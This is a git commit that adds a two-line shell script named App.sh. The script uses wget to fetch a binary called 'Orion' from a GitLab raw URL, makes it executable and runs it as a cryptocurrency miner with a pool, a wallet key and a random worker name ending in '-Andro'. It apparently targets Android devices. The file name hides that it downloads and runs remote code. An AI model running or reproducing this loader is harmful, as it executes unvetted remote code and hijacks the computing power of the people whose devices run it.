206d76636cff01e0b41abdd8fe4d732d162840ef
duniaboci13 <93588768+duniaboci13@users.noreply.github.com>
2025-06-20 13:12:27 +0700

    Create App.sh

---
+++ App.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key APD1Uto5Rb5KbURTRrnfYuH1FjrH9eg4itLxfPZcnMHy --worker $(shuf -n 1 -i 1-99999)-Andro
